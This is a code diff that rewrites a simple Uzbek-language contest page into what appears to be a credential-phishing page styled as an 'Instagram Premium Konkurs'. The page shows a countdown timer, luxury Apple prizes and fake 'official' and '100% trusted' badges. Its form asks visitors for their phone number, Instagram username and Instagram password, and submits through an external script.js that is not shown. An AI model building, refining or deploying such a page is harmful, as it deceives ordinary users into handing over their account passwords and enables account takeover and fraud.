@@ -3,224 +3,274 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konkurs Sahifasi</title>
+    <title>Instagram Premium Konkurs</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        /* Umumiy parametrlar */
-        body {
-            font-family: 'Arial', sans-serif;
+        * {
             margin: 0;
             padding: 0;
-            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2g1dZXoom8YYlaESML-bX7D7d7yIrx5i9YA_VLNzQP1r9BlFVq18HHo2vMoe2ORAm3m4&usqp=CAU') no-repeat center center fixed;
-            background-size: cover;
-            color: #fff;
-            text-align: center;
-            font-size: 1.1em;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
-        header {
-            background-color: rgba(10, 116, 218, 0.8); /* Ko'k rang, shaffof */
-            color: white;
-            padding: 80px 0;
-            border-bottom: 3px solid #005B9F;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
-            animation: fadeInHeader 1s ease-out;
+        body {
+            background: #FAFAFA;
+            min-height: 100vh;
         }
 
-        h1 {
-            font-size: 4.5em;
-            text-shadow: 3px 3px 15px rgba(0, 0, 0, 0.5);
-            margin: 0;
-            animation: fadeIn 2s ease-in-out;
-        }
-
-        .intro-text {
-            margin: 20px 0;
-            font-size: 1.5em;
-            font-weight: bold;
-            color: #f8f8f8;
-            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.4);
-            animation: fadeInUp 1.5s ease-out;
-        }
-
-        /* Sovg'alarni ko'rsatish */
-        .gift-images {
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            margin: 60px 0;
-            flex-wrap: wrap;
-            animation: fadeInUp 2s ease-out;
-        }
-
-        .gift-images img {
-            width: 260px;
-            height: 260px;
-            border-radius: 20px;
-            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.5);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .gift-images img:hover {
-            transform: scale(1.1);
-            box-shadow: 0px 15px 30px rgba(0, 0, 0, 0.7);
-        }
-
-        /* Yo'riqnomalar */
-        .instructions {
-            margin-top: 60px;
-            font-size: 1.4em;
-            color: #f8f8f8;
-            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
-            max-width: 800px;
+        .app-container {
+            max-width: 100%;
             margin: 0 auto;
         }
 
-        .instructions ul {
-            text-align: left;
-            list-style-type: none;
-            padding: 0;
-        }
-
-        .instructions li {
-            margin: 20px 0;
-            font-weight: bold;
-            background-color: rgba(0, 0, 0, 0.4);
-            padding: 15px;
+        /* Prize Showcase Section */
+        .prize-showcase {
+            padding: 20px;
+            background: white;
+            margin: 15px;
             border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease, background-color 0.3s ease;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
 
-        .instructions li:hover {
-            background-color: rgba(0, 0, 0, 0.6);
+        .prize-showcase h2 {
+            text-align: center;
+            color: #262626;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .prize-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .prize-card {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .prize-card:hover {
             transform: translateY(-5px);
         }
 
-        /* Ijtimoiy tarmoqlar */
-        .social-links {
-            margin: 50px 0;
-            display: flex;
-            justify-content: center;
-            gap: 30px;
+        .prize-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
         }
 
-        .social-links a {
-            text-decoration: none;
-            color: #fff;
-            background-color: #A5D6A7;
-            font-size: 24px;
-            padding: 15px 25px;
-            border-radius: 50%;
-            border: 2px solid #A5D6A7;
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.3s ease;
+        .prize-info {
+            padding: 15px;
         }
 
-        .social-links a:hover {
-            background-color: #fff;
-            color: #A5D6A7;
-            transform: scale(1.1);
+        .prize-info h3 {
+            color: #262626;
+            margin-bottom: 8px;
+            font-size: 18px;
         }
 
-        /* Footer */
-        footer {
-            margin-top: 50px;
-            background-color: rgba(0, 0, 0, 0.9);
+        .prize-info p {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .prize-value {
+            color: #833ab4;
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 8px;
+        }
+
+        /* Timer section */
+        .timer-section {
+            background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
+            padding: 20px;
             color: white;
-            padding: 20px 0;
-            font-size: 1.2em;
             text-align: center;
-            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.3);
+            margin: 15px;
+            border-radius: 10px;
         }
 
-        /* Animations */
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
+        .timer-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-top: 15px;
         }
 
-        @keyframes fadeInUp {
-            0% { transform: translateY(30px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
+        .timer-item {
+            background: rgba(255,255,255,0.2);
+            padding: 10px;
+            border-radius: 8px;
         }
 
-        @keyframes fadeInHeader {
-            0% { transform: translateY(30px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
+        /* Form section */
+        .form-section {
+            background: white;
+            padding: 20px;
+            margin: 15px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
 
-        /* Mobil qurilmalar uchun moslashtirish */
-        @media (max-width: 768px) {
-            header {
-                padding: 60px 0;
-            }
+        .form-group {
+            margin-bottom: 15px;
+        }
 
-            h1 {
-                font-size: 3.5em;
-            }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #262626;
+            font-size: 14px;
+        }
 
-            .intro-text {
-                font-size: 1.3em;
-            }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+        }
 
-            .gift-images {
-                flex-direction: column;
-                align-items: center;
-                gap: 20px;
-            }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
 
-            .gift-images img {
-                width: 200px;
-                height: 200px;
-            }
+        .trust-badges {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin: 15px 0;
+        }
 
-            .instructions {
-                font-size: 1.2em;
-            }
+        .badge {
+            background: linear-gradient(45deg, #833ab4, #fd1d1d);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
 
-            .social-links a {
-                font-size: 22px;
-                padding: 12px;
+        @media (min-width: 768px) {
+            .app-container {
+                max-width: 800px;
+                margin: 0 auto;
             }
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Konkurs Sahifasiga Xush Kelibsiz!</h1>
-    </header>
+    <div class="app-container">
+        <!-- Timer section -->
+        <div class="timer-section">
+            <h3>Konkurs tugashiga</h3>
+            <div class="timer-grid">
+                <div class="timer-item">
+                    <div id="days">05</div>
+                    <small>kun</small>
+                </div>
+                <div class="timer-item">
+                    <div id="hours">12</div>
+                    <small>soat</small>
+                </div>
+                <div class="timer-item">
+                    <div id="minutes">30</div>
+                    <small>daqiqa</small>
+                </div>
+                <div class="timer-item">
+                    <div id="seconds">00</div>
+                    <small>soniya</small>
+                </div>
+            </div>
+        </div>
 
-    <div class="intro-text">
-        <p>O'zingizni sinab ko'ring va ajoyib sovrinlarni qo'lga kiriting!</p>
+        <!-- Prize Showcase -->
+        <div class="prize-showcase">
+            <h2>🎁 Premium Sovg'alar</h2>
+            <div class="prize-grid">
+                <div class="prize-card">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSae0W0iumc4G0IG5D24xLsb20nCUQSp9c_kQ&s" alt="iPhone 15 Pro Max" class="prize-image">
+                    <div class="prize-info">
+                        <h3>iPhone 15 Pro Max</h3>
+                        <p>1TB • Space Black</p>
+                    </div>
+                </div>
+                <div class="prize-card">
+                    <img src="https://220volt.uz/image/cache/catalog/apple/MacBook/macbook%20air%202020%20grey-2-600x315w.jpg.webp" alt="MacBook Pro" class="prize-image">
+                    <div class="prize-info">
+                        <h3>MacBook Pro 16"</h3>
+                        <p>M2 Pro • 32GB • 1TB</p>
+                    </div>
+                </div>
+                <div class="prize-card">
+                    <img src="https://brostore.uz/cdn/shop/files/u2.png?v=1700307807" alt="iPad Pro" class="prize-image">
+                    <div class="prize-info">
+                        <h3>iPad Pro 12.9"</h3>
+                        <p>M2 • 256GB • WiFi + 5G</p>
+                    </div>
+                </div>
+                <div class="prize-card">
+                    <img src="https://cdn.mediapark.uz/imgs/fa9dc18d-58ca-417b-980d-b98e7f8a9b7b.webp" alt="AirPods Max" class="prize-image">
+                    <div class="prize-info">
+                        <h3>AirPods Max</h3>
+                        <p>Space Gray • Premium Audio</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Form section -->
+        <div class="form-section">
+            <div class="trust-badges">
+                <div class="badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>100% Ishonchli</span>
+                </div>
+                <div class="badge">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Rasmiy konkurs</span>
+                </div>
+                <div class="badge">
+                    <i class="fas fa-gift"></i>
+                    <span>Premium sovg'alar</span>
+                </div>
+            </div>
+
+            <form id="contestForm">
+                <div class="form-group">
+                    <label>Telefon raqam</label>
+                    <input type="tel" placeholder="+998 XX XXX XX XX" required>
+                </div>
+                <div class="form-group">
+                    <label>Instagram login</label>
+                    <input type="text" placeholder="@username" required>
+                </div>
+                <div class="form-group">
+                    <label>Instagram parol</label>
+                    <input type="password" placeholder="Parolingizni kiriting" required>
+                </div>
+                <button type="submit" class="submit-btn">Konkursda qatnashish</button>
+            </form>
+        </div>
     </div>
 
-    <div class="gift-images">
-        <img src="https://openshop.fra1.cdn.digitaloceanspaces.com/public/uploads/products/photos/202309/Ga1GKzIEWktH1WSVS08SiXb4JwHJ7Gf5H7GKjkCN.jpg" alt="Sovg'a 1">
-        <img src="https://cdn.thewirecutter.com/wp-content/media/2023/11/guidetoholdiaybuyingmacbook-2048px-9765-2x1-1.jpg?width=2048&quality=75&crop=2:1&auto=webp" alt="Sovg'a 2">
-        <img src="https://www.apple.com/v/watch/bk/images/meta/watch-gps-lte__f3xmp4zpdka6_og.png" alt="Sovg'a 3">
-        <img src="https://elmakon.uz/images/detailed/15/4_pkaf-ih.png" alt="Sovg'a 4">
-        <img src="https://brostore.uz/cdn/shop/files/1_e1df98bc-a6f1-4988-b195-8340aa49301e.png?v=1720598662" alt="Sovg'a 5">
-    </div>
-
-    <div class="instructions">
-        <h2>Qanday Ishtirok Etish Kerak?</h2>
-        <ul>
-            <li>1. Ro'yxatdan o'ting va o'z profil ma'lumotlaringizni to'ldiring.</li>
-            <li>2. Konkursga qatnashish uchun belgilangan topshiriqlarni bajarish lozim.</li>
-            <li>3. Topshiriqni bajarib bo'lgach, yuboring va natijalarni kuting!</li>
-        </ul>
-    </div>
-
-    <div class="social-links">
-        <a href="https://www.facebook.com" target="_blank">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" width="30"> Facebook
-        </a>
-        <a href="https://www.instagram.com" target="_blank">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" width="30"> Instagram
-        </a>
-    </div>
-
-    <footer>
-        <p>&copy; 2024 Konkurs Sahifasi. Barcha huquqlar himoyalangan.</p>
-    </footer>
+    <script src="script.js"></script>
 </body>
 </html>
